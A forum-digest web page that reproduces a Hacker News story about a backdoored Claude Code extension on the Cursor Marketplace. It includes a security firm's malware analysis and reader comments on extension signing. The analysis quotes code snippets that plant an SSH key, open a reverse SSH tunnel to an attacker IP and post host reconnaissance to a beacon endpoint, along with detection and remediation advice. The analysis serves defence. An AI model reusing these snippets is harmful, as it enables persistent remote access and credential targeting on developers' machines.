@@ -1,0 +1,694 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Backdoor in Claude Code for VS Code extension on the Cursor Marketplace | AI/科技论坛日报</title>
+  <style>
+  :root {
+    --bg: #f6f7f4;
+    --paper: #ffffff;
+    --ink: #202124;
+    --muted: #687076;
+    --line: #d9ded8;
+    --accent: #c24f18;
+    --accent-soft: #fff1e8;
+    --blue: #255f85;
+    --green: #276749;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--ink);
+    font-family: "Noto Sans SC", "PingFang SC", "Microsoft YaHei", Arial, sans-serif;
+    line-height: 1.62;
+  }
+  .page {
+    width: min(980px, 100%);
+    margin: 0 auto;
+    padding: 18px 14px 72px;
+  }
+  .topbar, .section {
+    background: var(--paper);
+    border: 1px solid var(--line);
+    border-radius: 8px;
+    padding: 16px;
+    margin-bottom: 14px;
+  }
+  .topbar h1 {
+    margin: 0;
+    font-size: 1.5rem;
+    line-height: 1.25;
+  }
+  .subtitle, .original-title, .muted, .reason {
+    color: var(--muted);
+  }
+  .subtitle, .original-title {
+    margin: 6px 0 0;
+  }
+  .source-chip {
+    display: inline-block;
+    margin-bottom: 8px;
+    color: var(--blue);
+    font-weight: 700;
+  }
+  .meta-line, .card-kicker {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px 12px;
+    margin-top: 8px;
+    color: var(--muted);
+    font-size: 0.88rem;
+  }
+  .actions {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px;
+    margin-top: 12px;
+  }
+  .btn {
+    border: 1px solid var(--accent);
+    background: var(--accent);
+    color: #fff;
+    border-radius: 6px;
+    padding: 7px 11px;
+    font-size: 0.9rem;
+    text-decoration: none;
+    cursor: pointer;
+    line-height: 1.2;
+  }
+  .btn.secondary {
+    background: var(--accent-soft);
+    color: var(--accent);
+  }
+  .back-link {
+    color: var(--accent);
+    text-decoration: none;
+    font-size: 0.9rem;
+  }
+  .source-section {
+    margin-top: 18px;
+  }
+  .source-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: baseline;
+    margin-bottom: 10px;
+    border-bottom: 2px solid var(--line);
+  }
+  .source-header h2, .section h2 {
+    margin: 0 0 8px;
+    font-size: 1.08rem;
+  }
+  .section h3 {
+    margin: 14px 0 6px;
+    font-size: 1rem;
+  }
+  .story-list {
+    display: grid;
+    gap: 10px;
+  }
+  .story-card {
+    display: grid;
+    grid-template-columns: 46px 1fr;
+    gap: 10px;
+    background: var(--paper);
+    border: 1px solid var(--line);
+    border-radius: 8px;
+    padding: 14px;
+  }
+  .rank {
+    color: var(--green);
+    font-weight: 700;
+  }
+  .story-card h3 {
+    margin: 4px 0 0;
+    font-size: 1.04rem;
+    line-height: 1.35;
+  }
+  .story-card h3 a {
+    color: var(--ink);
+    text-decoration: none;
+  }
+  .story-card h3 a:hover {
+    text-decoration: underline;
+  }
+  .summary-preview {
+    margin: 8px 0 0;
+  }
+  .compact-list ul, .section ul {
+    margin: 8px 0 0;
+    padding-left: 20px;
+  }
+  .compact-list li + li, .section li + li {
+    margin-top: 4px;
+  }
+  .post-body, .comment-text {
+    overflow-wrap: anywhere;
+  }
+  .post-body code, .comment-text code {
+    background: #eef1ef;
+    padding: 1px 4px;
+    border-radius: 4px;
+  }
+  .post-body pre, .comment-text pre {
+    overflow-x: auto;
+    padding: 10px;
+    border-radius: 6px;
+    background: #202124;
+    color: #f6f7f4;
+  }
+  .comment-tree {
+    display: grid;
+    gap: 8px;
+  }
+  .comment-node {
+    border-left: 2px solid var(--line);
+    padding-left: 10px;
+  }
+  .comment-node.depth-2 { border-left-color: #adc7ba; }
+  .comment-node.depth-3, .comment-node.depth-4 { border-left-color: #95afc0; }
+  .comment-node > summary {
+    cursor: pointer;
+    color: var(--muted);
+    font-size: 0.88rem;
+  }
+  .comment-body {
+    padding: 8px 0 4px;
+  }
+  .comment-children {
+    display: grid;
+    gap: 8px;
+    margin-top: 8px;
+  }
+  .badge, .count {
+    border: 1px solid var(--line);
+    border-radius: 999px;
+    padding: 1px 7px;
+    color: var(--muted);
+    font-size: 0.78rem;
+  }
+  .empty-source {
+    background: var(--paper);
+    border: 1px dashed var(--line);
+    border-radius: 8px;
+    padding: 12px;
+  }
+  .is-hidden { display: none; }
+  .redirect-page {
+    min-height: 65vh;
+    display: grid;
+    place-content: center;
+    gap: 10px;
+    text-align: center;
+  }
+  @media (max-width: 640px) {
+    .story-card {
+      grid-template-columns: 1fr;
+    }
+    .rank {
+      margin-bottom: -4px;
+    }
+  }
+  </style>
+</head>
+<body data-page="story">
+  <main class="page story-page">
+    <header class="topbar">
+      <a class="back-link" href="https://wshyhlm1.github.io/forum-digest/batches/2026-10-31/">返回日报</a>
+      <div class="source-chip">Hacker News #5</div>
+      <h1>Backdoor in Claude Code for VS Code extension on the Cursor Marketplace</h1>
+      <p class="original-title">Backdoor in Claude Code for VS Code extension on the Cursor Marketplace</p>
+      <div class="meta-line">
+        <span>AI</span>
+        <span>作者 _chall</span>
+        <span>热度 890</span>
+        <span>回复 529</span>
+        <span>2026/10/30 15:09</span>
+      </div>
+      <div class="actions">
+        <a class="btn" href="https://news.ycombinator.com/item?id=50300683" target="_blank" rel="noopener noreferrer">打开原帖</a>
+        <a class="btn" href="https://phorion.io/blog/offical-claude-code-vsx-compromise/" target="_blank" rel="noopener noreferrer">打开外部链接</a>
+        <a class="btn secondary" href="https://wshyhlm1.github.io/forum-digest/stories/hackernews-50300683.json">JSON</a>
+      </div>
+    </header>
+
+    <section class="section">
+      <h2>摘要</h2>
+      <ul><li>TL;DRPhorion has detected a backdoor in the official Claude Code for VS Code extension bundle on the Cursor Marketplace that drops a persistent SSH backdoor across macOS, Linux, and Windows. This write-up focuses primarily on macOS, where the extension attempts to configure an SSH backdoor and establish persistence.Organisations should immediately review their environments for use of Claude Code for VSCode 2.1.312 or 2.1.313 and engage incident response where use of the extension is discovered.Update (31 October 2026): Cursor’s security notice now identifies versions 2.1.312 and 2.1.313 distributed through the Cursor Marketplace for macOS and Windows as affected. This advisory previously identified only 2.1.313; the affected-version guidance below has been updated accordingly.Phorion has discovered a compromise of the official Claude Code for VS Code extension on the Cursor Marketplace, where the backdoored extension bundle contains a persistent Secure Shell (SSH) backdoor. Cursor has removed the affected versions, 2.1.312 and 2.1.313, from its marketplace.While the implant includes setup and persistence logic for macOS, Linux, and Windows, we’re going to focus primarily on macOS in this post, calling out the key differences and a few implementation bugs on the other platforms along the way.The Cursor Marketplace serves extensions for the Cursor editor. Because extensions run with the permissions of the IDE and the user running it, a backdoored extension gets immediate access to local files, source code, and developer tooling as soon as its module is loaded.Notably, Phorion has discovered a likely oversight in how the malware tries to turn on SSH. The setup logic assumes it can check the current Remote Login state without root privileges. When run as a standard user, systemsetup -getremotelogin prints an administrator-access error and exits with status 0 instead of returning Off. Because the script only tries to enable SSH if the output matches Off, it skips the enablement step entirely. On a Mac that doesn’t already have SSH running, that mistake breaks the inbound access path, even though the SSH keys and persistence still get dropped.In this post, we’ll walk through how the backdoor works, why that macOS check fails, and what to look for across your fleet. The goal of this payload is long-term interactive access, and whilst the SSH backdoor bug minimises impact on macOS, the malware is still a significant threat that installs persistence and beacons host reconnaissance back to the operator.Infection ChainThe Cursor Marketplace ExtensionThe compromised extension.js file starts with an injected immediately invoked function expression (IIFE) prepended to the minified extension bundle. The rest of the bundle looks like the standard extension, with Claude Code and VS Code strings, normal activate and deactivate exports, and UI code.The injected prefix pulls in standard Node.js modules (child_process, fs, os, path, http, and crypto) and executes as soon as Node loads the file, before the extension’s normal activate callback even runs. The user doesn’t need to interact with the extension for the payload to fire.Stage 1 - Preparing SSH AccessFirst, the payload makes sure ~/.ssh exists and appends an attacker-controlled Ed25519 public key to ~/.ssh/authorized_keys, setting permissions to 0700 on the directory and 0600 on the file.The key uses the comment svc-telemetry. Before appending, the script checks whether svc-telemetry is already in the file rather than checking for the key itself. When hunting for this activity, it’s worth checking the public-key fingerprint rather than relying solely on the comment string.var sd = path.join(HOME, &quot;.ssh&quot;), ak = path.join(sd, &quot;authorized_keys&quot;); // ... if (cur.indexOf(&quot;svc-telemetry&quot;) &lt; 0) { fs.appendFileSync(ak, PUB + &quot;\n&quot;); d.sshKey = &quot;added&quot; } else { d.sshKey = &quot;present&quot; } Here, cur holds the existing contents of authorized_keys, and PUB is the embedded attacker public key (redacted here).With the key in place, anyone holding the matching private key can authenticate as that user, provided SSH is actually running. The next step in the script tries to make sure the local SSH daemon is enabled and listening:Linux: tries to enable and start sshd or ssh via systemctl, falling back to service and /etc/init.d/.macOS: checks Remote Login and, if it reports Off, tries to enable it via sudo -n systemsetup -setremotelogin on.Windows: tries to install and start OpenSSH Server using PowerShell.None of these steps include a privilege escalation exploit. Non-interactive sudo -n will fail unless the user already has passwordless sudo cached or configured, so starting a system service won’t always succeed from a standard user context.It looks like the Windows code path also has its own bug: it passes the PowerShell service setup command through a helper function (det()) that hardcodes /bin/sh, which isn’t going to get very far on a standard Windows install.A bug in the macOS SSH logic?On macOS, the setup may run into problems before it even gets to the sudo command. The script runs systemsetup -getremotelogin without elevation and tests the output against /Off/i. It only tries to enable Remote Login if the output contains Off:// ... else if (PLAT === &quot;darwin&quot;) { var rl = ex(&quot;systemsetup -getremotelogin 2&gt;/dev/null&quot;, 4000); d.remoteLogin = rl; if (/Off/i.test(rl)) { det(&quot;sudo -n systemsetup -setremotelogin on &gt;/dev/null 2&gt;&amp;1&quot;); d.remoteLoginOn = &quot;tried&quot; } } Notice that the second command (-setremotelogin on) uses sudo -n, while the first command (-getremotelogin) doesn’t. When you run systemsetup -getremotelogin as a standard user on macOS, you get this instead:You need administrator access to run this tool... exiting! systemsetup refuses to read the setting without administrator privileges, prints the error to stdout, and exits with status 0. The malware’s ex() helper grabs stdout and returns it:function ex(c, t) { try { return cp.execSync(c, { timeout: t || 3000, stdio: [&quot;ignore&quot;, &quot;pipe&quot;, &quot;ignore&quot;], windowsHide: true }).toString().trim() } catch (e) { return &quot;&quot; } } Because the output is &quot;You need administrator access to run this tool... exiting!&quot;, /Off/i.test(rl) evaluates to false.As a result, the script skips the if block and never runs sudo -n systemsetup -setremotelogin on. It effectively treats “I don’t have permission to check if SSH is off” as “SSH is already on”, which also explains why you won’t see the enablement attempt in process telemetry when the extension runs as a normal user.This bug can break the final step of the access chain. If Remote Login isn’t already enabled on the Mac, the outbound tunnel can still connect to the attacker’s server, but any traffic forwarded back through the tunnel will hit a closed port 22 on localhost.Of course, that isn’t something to rely on as a defence. If the user already had Remote Login enabled, or turns it on later, the backdoor is ready and waiting.Stage 2 - Establishing the Reverse SSH TunnelNext, the script sets up an outbound SSH connection to 134.209.82[.]225 as the tunnel user on port 22. To authenticate to the attacker’s server, it decodes a separate embedded private key: an unencrypted OpenSSH Ed25519 key with the comment svc-telemetry-tun.It’s worth keeping the two keys straight during an investigation:The public key added to ~/.ssh/authorized_keys (svc-telemetry) lets the attacker log into the victim’s machine.The embedded private key (svc-telemetry-tun) lets the victim’s machine connect out to the attacker’s tunnel server.The script writes this tunnel key to the OS temporary directory with a filename starting with .stk_, followed by the first ten characters of the MD5 hash of the hostname and home directory path:var kf = path.join( TMP, &quot;.stk_&quot; + crypto.createHash(&quot;md5&quot;) .update(String(os.hostname()) + HOME).digest(&quot;hex&quot;).slice(0, 10) ); // ... var RF = (PLAT === &quot;win32&quot;) ? &quot;\&quot;*:0:localhost:22\&quot;&quot; : &quot;&#39;*:0:localhost:22&#39;&quot;; The tunnel uses -R *:0:localhost:22 for remote port forwarding. Passing 0 asks the attacker’s SSH server to dynamically allocate a listening port and forward any traffic hitting it back through the tunnel to localhost:22 on the victim’s machine:Affected host -- outbound SSH tunnel --&gt; External SSH server</li><li>Operator -- separate connection --&gt; Server&#39;s allocated port | Through the existing tunnel | v Affected host&#39;s SSH:22 | Login using the planted key Because the tunnel runs with -N, it just holds the port forward open without executing a command on the remote server. When the operator wants to access the machine, they start a separate SSH session through the allocated port on their server, authenticating against the victim’s local SSH daemon using the key planted in Stage 1. That gives them a full interactive shell and file transfer capability without needing any custom C2 command handling in the JavaScript itself.The SSH command also passes flags to keep the connection quiet and non-interactive: host-key checking is disabled, known_hosts is ignored, BatchMode and IdentitiesOnly are enabled, keepalives are set to 30 seconds (ServerAliveCountMax=3), and ExitOnForwardFailure is turned on.If autossh is installed, the script uses it; otherwise it falls back to standard ssh. It wraps the connection in a detached retry loop that sleeps for 60 seconds between attempts, using pgrep on Unix systems to avoid spinning up duplicate initial tunnels. Because the loop is detached, the tunnel stays up even after the user closes their IDE.Stage 3 - Keeping Access AvailableTo survive a reboot, the script sets up platform-specific persistence alongside the initial detached tunnel:PlatformArtifactsPersistence mechanismNotesLinux~/.config/.smt, ~/.config/.smtkWrites a shell script that recreates the tunnel key and loops the SSH connection, then adds an @reboot entry to the user’s crontab.Contains a bug in the crontab check that can wipe existing user cron jobs on repeat runs (detailed below).macOS~/.config/.smt, ~/.config/.smtk, ~/Library/LaunchAgents/com.apple.sysmond.plistWrites a user LaunchAgent that runs /bin/sh ~/.config/.smt with RunAtLoad and KeepAlive set to true, then loads it via launchctl.Runs in the user context rather than as a root LaunchDaemon.Windows~/.config/smt.cmd, ~/.config/smtk, %APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmdTries to create a scheduled task named SysMon running as SYSTEM on startup. If that fails, drops sysmon.cmd into the user’s Startup folder.Creating a SYSTEM task requires admin privileges; the Startup folder fallback runs as the user at login.On macOS and Linux, the ~/.config/.smt script has the tunnel private key embedded inside it and writes it out to ~/.config/.smtk before starting the reconnection loop.On macOS, the LaunchAgent disguises itself as com.apple.sysmond.plist inside ~/Library/LaunchAgents/:&lt;key&gt;Label&lt;/key&gt; &lt;string&gt;com.apple.sysmond&lt;/string&gt; &lt;!-- ... --&gt; &lt;key&gt;RunAtLoad&lt;/key&gt; &lt;true/&gt; &lt;key&gt;KeepAlive&lt;/key&gt; &lt;true/&gt; Stage 4 - Host ReconFinally, the script gathers basic host reconnaissance and sends a one-off beacon back to the attacker’s server:Hostname, username, OS platform, and architectureHome directory, current working directory, and global Git email (git config --global user.email)Public IP address and status flags from each setup stage (e.g. whether the SSH key was added and which persistence method ran)Up to 40 environment variable names (not values) matching /KEY|TOKEN|SECRET|PASS|AWS|GCP/iThe environment variable check uses Object.keys(process.env):Object.keys(process.env) .filter(function(k) { return /KEY|TOKEN|SECRET|PASS|AWS|GCP/i.test(k) }) .slice(0, 40) Because it only grabs the variable names, the beacon doesn’t exfiltrate the secret values themselves. Instead, it gives the operator a quick inventory of which cloud credentials or API tokens live on the machine so they know which hosts to prioritise.To get the machine’s public IP, the script queries ifconfig[.]me, falling back to api[.]ipify[.]org.It then sends the JSON report via plaintext HTTP POST requests to /beacon on both 134.209.82[.]225:8099 and 127.0.0.1:8099:var r = http.request({ host: h, port: p, path: &quot;/beacon&quot;, method: &quot;POST&quot;, timeout: 3000, headers: {&quot;content-type&quot;: &quot;application/json&quot;} }, function(res) { res.resume() }); // ... r.write(JSON.stringify(d)); r.end() Why it also sends a copy of the beacon to 127.0.0.1:8099 isn’t clear from the sample; the script itself doesn’t set up a local listener on that port.The beacon is scheduled once with setTimeout (1.5 seconds after the initial setup runs) and discards any HTTP response with res.resume(). It’s purely a check-in to let the operator know the host is ready, while the SSH tunnel handles the actual access.Detection OpportunitiesFrom a detection standpoint, there are several behaviours in this chain that stand out on macOS using Endpoint Security Framework (ESF) telemetry.SSH Key and Configuration ChangesBecause the malware appends to ~/.ssh/authorized_keys directly using Node’s fs.appendFileSync, process-only rules watching for shell commands like echo or tee touching authorized_keys won’t catch it. This is where file modification telemetry is essential: watching for IDE helper processes (Code Helper, Cursor Helper, etc.) creating or writing to ~/.ssh/authorized_keys.Even though the IDE binary itself is validly signed, its extension host process has no business modifying SSH authentication files in the background.While you should also monitor for systemsetup -setremotelogin on, don’t rely on it as a required condition for alerting on this campaign. As we saw above, the broken state check on macOS means that command often won’t run at all.User LaunchAgent PersistenceThe persistence setup on macOS gives us a couple of strong signals:A non-Apple process writing a plist with a com.apple.* label (~/Library/LaunchAgents/com.apple.sysmond.plist).A LaunchAgent configured to execute /bin/sh against a hidden script in the user’s home directory (~/.config/.smt).Because the initial tunnel is spawned as a detached process and launchd later manages .smt directly, the subsequent ssh processes won’t have the IDE as their immediate parent in a live process tree. Correlating the file creation of .smt and com.apple.sysmond.plist back to the IDE extension host makes it much easier to piece the chain together.SSH Tunnels and Follow-On AccessOn the process and network side, look for:ssh or autossh launched with remote port forwarding (-R *:0:localhost:22) and identity files pulled from /tmp/.stk_* or ~/.config/.smtk.Outbound SSH connections to 134.209.82[.]225 on port 22, alongside HTTP POST requests to 134.209.82[.]225:8099 (and connection attempts to 127.0.0.1:8099).If you find a host where this extension ran, it’s important to check whether the tunnel was merely established or whether an operator actually logged in through it. Because inbound sessions arrive through the local port forward, successful logins in SSH logs will appear to come from localhost (127.0.0.1 or ::1) authenticating with the svc-telemetry key.RemediationIf you identify an affected machine, uninstalling the extension alone won’t remove the backdoor. Make sure your response covers all of the stages it drops:Kill active tunnel processes: Terminate the /bin/sh retry loop and any ssh or autossh processes connecting to 134.209.82[.]225.Remove persistence: Unload and delete ~/Library/LaunchAgents/com.apple.sysmond.plist on macOS (or clean up the @reboot cron entry on Linux / SysMon scheduled task and Startup script on Windows), and remove ~/.config/.smt and ~/.config/.smtk.Clean up SSH keys and state: Remove the svc-telemetry public key from ~/.ssh/authorized_keys, delete /tmp/.stk_*, and verify that Remote Login (SSH) hasn’t been enabled unexpectedly.Rotate credentials: If SSH was enabled on the host, or if there’s any evidence of an inbound login, rotate any credentials or tokens that were accessible to that user account (especially those matching the KEY|TOKEN|SECRET|PASS|AWS|GCP environment variable filter).Phorion’s ApproachPhorion’s out-of-the-box detection coverage flags the macOS persistence used in this attack across multiple rules, including non-Apple processes creating com.apple.* LaunchAgents and LaunchAgents executing shell scripts from hidden directories.Beyond persistence, Phorion’s file access telemetry captures the IDE extension host modifying ~/.ssh/authorized_keys directly, and Phorion Protections can be used to lock down ~/.ssh/ so that only authorised processes can read or modify SSH keys and configuration files in the first place.If you want to see how Phorion detects and blocks supply chain threats like this across your Mac fleet, get in touch to arrange a demo.IndicatorsSample and Public-Key FingerprintsIndicatorValueNotesSHA-256ecb58cb29078d9646ad1dcdbe51526f2d9cfea06be5fb2ab183e8ecc3ab6bf15Backdoored extension.js bundleVictim-login public-key fingerprintSHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htkEd25519 key appended to ~/.ssh/authorized_keys (comment svc-telemetry)Tunnel public-key fingerprintSHA256:KOAU57+ZG6u3MG4WwzPzPX2O5YEe9qdOC1Bl+6MVyDQEmbedded Ed25519 key used to authenticate to the tunnel server (comment svc-telemetry-tun)Network IndicatorsIndicatorTypeNotes134.209.82[.]225 (TCP 22, user tunnel)IP / SSHOutbound reverse SSH tunnel server134.209.82[.]225:8099 (POST /beacon)IP / HTTPExternal host-report beacon endpoint127.0.0.1:8099 (POST /beacon)Loopback / HTTPLocal beacon destinationifconfig[.]me, api[.]ipify[.]orgDomainLegitimate services queried for public IP discoveryHost ArtifactsArtifactPlatformNotes~/.&lt;ide&gt;/extensions/anthropic.claude-code-2.1.312-darwin-arm64macOS (Apple Silicon)Additional affected version identified in Cursor’s security notice (&lt;ide&gt; varies by editor)~/.&lt;ide&gt;/extensions/anthropic.claude-code-2.1.313-darwin-arm64macOS (Apple Silicon)Installed extension directory (&lt;ide&gt; varies by editor)~/.ssh/authorized_keys (comment svc-telemetry)AllPlanted Ed25519 public key&lt;TMP&gt;/.stk_&lt;10 hex chars&gt; ($TMPDIR/.stk_* on macOS)AllInitial tunnel private key in the OS temporary directory (suffix is first 10 hex chars of MD5(hostname + HOME))~/.config/.smt and ~/.config/.smtkmacOS, LinuxPersistence shell script and recreated tunnel private key~/Library/LaunchAgents/com.apple.sysmond.plistmacOSUser LaunchAgent executing /bin/sh ~/.config/.smt@reboot cron entry for ~/.config/.smtLinuxUser crontab persistence~/.config/smt.cmd and ~/.config/smtkWindowsPersistence batch script and tunnel private keyScheduled task SysMonWindowsStartup scheduled task (requests SYSTEM)%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmdWindowsStartup folder fallback script</li></ul>
+      
+      <p class="reason">命中 2 个 AI/科技关键词。</p>
+    </section>
+
+    <section class="section">
+      <h2>正文翻译</h2>
+      <div class="post-body" data-role="story-zh"><a href="https://cursor.com/blog/claude-code-extension-security-notice" target="_blank" rel="noopener noreferrer">https://cursor.com/blog/claude-code-extension-security-notic...</a></div>
+      <div class="post-body is-hidden" data-role="story-raw"><a href="https://cursor.com/blog/claude-code-extension-security-notice" target="_blank" rel="noopener noreferrer">https://cursor.com/blog/claude-code-extension-security-notic...</a></div>
+      <button type="button" class="btn secondary" data-action="toggle-story-raw">原文</button>
+    </section>
+
+    <section class="section comments">
+      <h2>回复翻译 <span class="count">20</span></h2>
+      <div class="comment-tree">
+        
+    <details class="comment-node depth-1">
+      <summary>
+        <span class="meta-author">felixrieseberg</span>
+        
+        <span>2026/10/30 22:08</span>
+        
+      </summary>
+      <div class="comment-body">
+        <div class="comment-text" data-role="comment-zh">Felix from Anthropic here.<p>We’re working with Cursor on this incident, but it wasn’t a compromise of Anthropic’s systems or employee laptops. A malicious actor used access to Cursor’s marketplace to publish a tampered copy of the Claude Code extension, which we didn’t build or publish. The versions on our official channels are not affected and this only impacts Cursor users.</p></div>
+        <div class="comment-text is-hidden" data-role="comment-raw" data-comment-key="hackernews-50304129">Felix from Anthropic here.<p>We’re working with Cursor on this incident, but it wasn’t a compromise of Anthropic’s systems or employee laptops. A malicious actor used access to Cursor’s marketplace to publish a tampered copy of the Claude Code extension, which we didn’t build or publish. The versions on our official channels are not affected and this only impacts Cursor users.</p></div>
+        <div class="actions">
+          <button type="button" class="btn secondary" data-action="toggle-raw" data-comment-key="hackernews-50304129">原文</button>
+          <button type="button" class="btn secondary" data-action="toggle-expand">展开</button>
+          <a class="btn secondary" href="https://news.ycombinator.com/item?id=50304129" target="_blank" rel="noopener noreferrer">楼层</a>
+        </div>
+        <div class="comment-children">
+    <details class="comment-node depth-2">
+      <summary>
+        <span class="meta-author">tzone</span>
+        
+        <span>2026/10/31 04:21</span>
+        
+      </summary>
+      <div class="comment-body">
+        <div class="comment-text" data-role="comment-zh">You can say that this isn't compromise of Anthropic, but it sort of is in the setup. Cursor Claude extension is marked as something made by Anthropic, so default assumption is that only people who can release that new extension would be a team at Anthropic.<p>Since that is clearly not the case, that is just as much Anthropic's problem as it is Cursor's problem. There either needs to be a technical change so that extensions are signed with keys that Anthropic controls, or you should take the branding off from the Cursor extensions.</p></div>
+        <div class="comment-text is-hidden" data-role="comment-raw" data-comment-key="hackernews-50309617">You can say that this isn't compromise of Anthropic, but it sort of is in the setup. Cursor Claude extension is marked as something made by Anthropic, so default assumption is that only people who can release that new extension would be a team at Anthropic.<p>Since that is clearly not the case, that is just as much Anthropic's problem as it is Cursor's problem. There either needs to be a technical change so that extensions are signed with keys that Anthropic controls, or you should take the branding off from the Cursor extensions.</p></div>
+        <div class="actions">
+          <button type="button" class="btn secondary" data-action="toggle-raw" data-comment-key="hackernews-50309617">原文</button>
+          <button type="button" class="btn secondary" data-action="toggle-expand">展开</button>
+          <a class="btn secondary" href="https://news.ycombinator.com/item?id=50309617" target="_blank" rel="noopener noreferrer">楼层</a>
+        </div>
+        <div class="comment-children">
+    <details class="comment-node depth-3">
+      <summary>
+        <span class="meta-author">ghshephard</span>
+        
+        <span>2026/10/31 07:24</span>
+        
+      </summary>
+      <div class="comment-body">
+        <div class="comment-text" data-role="comment-zh">I was working on the clearly mistaken impression that "Made by Anthropic" in the cursor store meant that the artifact had been signed by Anthropic.    If that is not the case, then two party's need to get their act together:<p></p><pre><code>  - Cursor needs to add signing if they want to claim something was "made" by another party.
+
+  - Anthropic needs to stamp out any provider from using said, "Made by Anthropic" until they start adding signing to their process.   Trademark law is useful here.
+
+</code></pre>
+Until that happens - it's almost like you have to delete any extension from the Cursor Store off of your Cursor instance - kind of a crapshoot what you are actually downloading, no?<p>For example - what guarantee do I have with something like: 
+" This publisher has verified ownership of cursor.com" - when I'm looking at the WSL extension.   Are there any guarantees it's not been replaced with some other extension?</p></div>
+        <div class="comment-text is-hidden" data-role="comment-raw" data-comment-key="hackernews-50311455">I was working on the clearly mistaken impression that "Made by Anthropic" in the cursor store meant that the artifact had been signed by Anthropic.    If that is not the case, then two party's need to get their act together:<p></p><pre><code>  - Cursor needs to add signing if they want to claim something was "made" by another party.
+
+  - Anthropic needs to stamp out any provider from using said, "Made by Anthropic" until they start adding signing to their process.   Trademark law is useful here.
+
+</code></pre>
+Until that happens - it's almost like you have to delete any extension from the Cursor Store off of your Cursor instance - kind of a crapshoot what you are actually downloading, no?<p>For example - what guarantee do I have with something like: 
+" This publisher has verified ownership of cursor.com" - when I'm looking at the WSL extension.   Are there any guarantees it's not been replaced with some other extension?</p></div>
+        <div class="actions">
+          <button type="button" class="btn secondary" data-action="toggle-raw" data-comment-key="hackernews-50311455">原文</button>
+          <button type="button" class="btn secondary" data-action="toggle-expand">展开</button>
+          <a class="btn secondary" href="https://news.ycombinator.com/item?id=50311455" target="_blank" rel="noopener noreferrer">楼层</a>
+        </div>
+        <div class="comment-children">
+    <details class="comment-node depth-4">
+      <summary>
+        <span class="meta-author">AtNightWeCode</span>
+        
+        <span>2026/10/31 07:36</span>
+        
+      </summary>
+      <div class="comment-body">
+        <div class="comment-text" data-role="comment-zh">The core problem is that VScode extensions does not need to be signed at all. Mind boggling stupid design decision.</div>
+        <div class="comment-text is-hidden" data-role="comment-raw" data-comment-key="hackernews-50311556">The core problem is that VScode extensions does not need to be signed at all. Mind boggling stupid design decision.</div>
+        <div class="actions">
+          <button type="button" class="btn secondary" data-action="toggle-raw" data-comment-key="hackernews-50311556">原文</button>
+          <button type="button" class="btn secondary" data-action="toggle-expand">展开</button>
+          <a class="btn secondary" href="https://news.ycombinator.com/item?id=50311556" target="_blank" rel="noopener noreferrer">楼层</a>
+        </div>
+        <div class="comment-children">
+    <details class="comment-node depth-4">
+      <summary>
+        <span class="meta-author">Rohansi</span>
+        
+        <span>2026/10/31 07:59</span>
+        
+      </summary>
+      <div class="comment-body">
+        <div class="comment-text" data-role="comment-zh">Isn't the Cursor Marketplace separate from VSCode's? Maybe it's as simple as someone impersonating Anthropic because they never registered there? Code signing alone wouldn't help in cases like that.</div>
+        <div class="comment-text is-hidden" data-role="comment-raw" data-comment-key="hackernews-50311743">Isn't the Cursor Marketplace separate from VSCode's? Maybe it's as simple as someone impersonating Anthropic because they never registered there? Code signing alone wouldn't help in cases like that.</div>
+        <div class="actions">
+          <button type="button" class="btn secondary" data-action="toggle-raw" data-comment-key="hackernews-50311743">原文</button>
+          <button type="button" class="btn secondary" data-action="toggle-expand">展开</button>
+          <a class="btn secondary" href="https://news.ycombinator.com/item?id=50311743" target="_blank" rel="noopener noreferrer">楼层</a>
+        </div>
+        <div class="comment-children">
+    <details class="comment-node depth-4">
+      <summary>
+        <span class="meta-author">yubblegum</span>
+        
+        <span>2026/10/31 08:31</span>
+        
+      </summary>
+      <div class="comment-body">
+        <div class="comment-text" data-role="comment-zh">Vendor A publishes a public key on their site for authenticating any signature. There is an entire subset of cryptography dedicated to addressing these needs. This is just yet another software player, Cursor, taking the absolutely easy no effort path because otherwise they would be, I don't know, "losers". I mean only losers would setup a basic authenticated provinance for bits of code they are pushing to the world to be executed by all and sundry. Really, this profession has become a complete clown show.</div>
+        <div class="comment-text is-hidden" data-role="comment-raw" data-comment-key="hackernews-50311999">Vendor A publishes a public key on their site for authenticating any signature. There is an entire subset of cryptography dedicated to addressing these needs. This is just yet another software player, Cursor, taking the absolutely easy no effort path because otherwise they would be, I don't know, "losers". I mean only losers would setup a basic authenticated provinance for bits of code they are pushing to the world to be executed by all and sundry. Really, this profession has become a complete clown show.</div>
+        <div class="actions">
+          <button type="button" class="btn secondary" data-action="toggle-raw" data-comment-key="hackernews-50311999">原文</button>
+          <button type="button" class="btn secondary" data-action="toggle-expand">展开</button>
+          <a class="btn secondary" href="https://news.ycombinator.com/item?id=50311999" target="_blank" rel="noopener noreferrer">楼层</a>
+        </div>
+        <div class="comment-children">
+    <details class="comment-node depth-4">
+      <summary>
+        <span class="meta-author">still_grokking</span>
+        
+        <span>2026/10/31 11:42</span>
+        
+      </summary>
+      <div class="comment-body">
+        <div class="comment-text" data-role="comment-zh">&gt; Really, this profession has become a complete clown show.<p>Always has been because there is so far zero liability for anything someone programs and distributes commercially. That's the <i>single root cause</i>. If not that software wouldn't be in general such major shit show. What we have is the result of being allowed to throw out even the most toxic shit out without any consequences if it causes damage, no mater how large the damage is. Software companies caused so far over the decades likely hundreds of billions, or even a few trillion damages in sum, yet nobody responsible ever got the bill. It's wild west—since now over 60 years. This has to stop finally!</p><p>Let's see where things will move as soon as we have regular product liability for software:</p><p><a href="https://eur-lex.europa.eu/legal-content/EN/TXT/?uri=legissum:4792027" target="_blank" rel="noopener noreferrer">https://eur-lex.europa.eu/legal-content/EN/TXT/?uri=legissum...</a></p><p>Just a few days left! Looking forward.</p></div>
